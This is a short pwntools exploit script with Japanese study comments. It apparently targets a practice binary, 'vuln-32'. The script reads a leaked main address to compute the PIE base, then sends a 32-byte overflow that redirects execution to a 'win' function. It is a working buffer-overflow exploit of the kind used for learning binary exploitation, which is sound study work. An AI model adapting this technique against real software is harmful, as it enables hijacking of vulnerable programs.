# pie-32はmainの関数アドレスがleakしている
# 実行してもアドレスが変わらなかった、そういうもの?
# 確かにobjdumpの結果は相対アドレスだったが、gdbのアドレスはプログラムが吐き出すアドレスと一致していた
# pwndbg の readdr コマンドでスタックにおける戻りアドレスが分かる

from pwn import *
elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil(b'at: ')
main = int(p.recvline(), 16)

# 実際のアドレス - 相対アドレス = ベースアドレス
# それを elf.address にセットすることで以降のプログラムが適切に稼働する
# 今回はmainの先頭アドレスがリークしているからこれができるだけ
# リターンアドレスがリークしているならこの書き方ではない
elf.address = main - elf.sym['main']

payload = b'A' * 32
payload += p32(elf.sym['win'])

p.sendline(payload)

print(p.clean().decode('latin-1'))
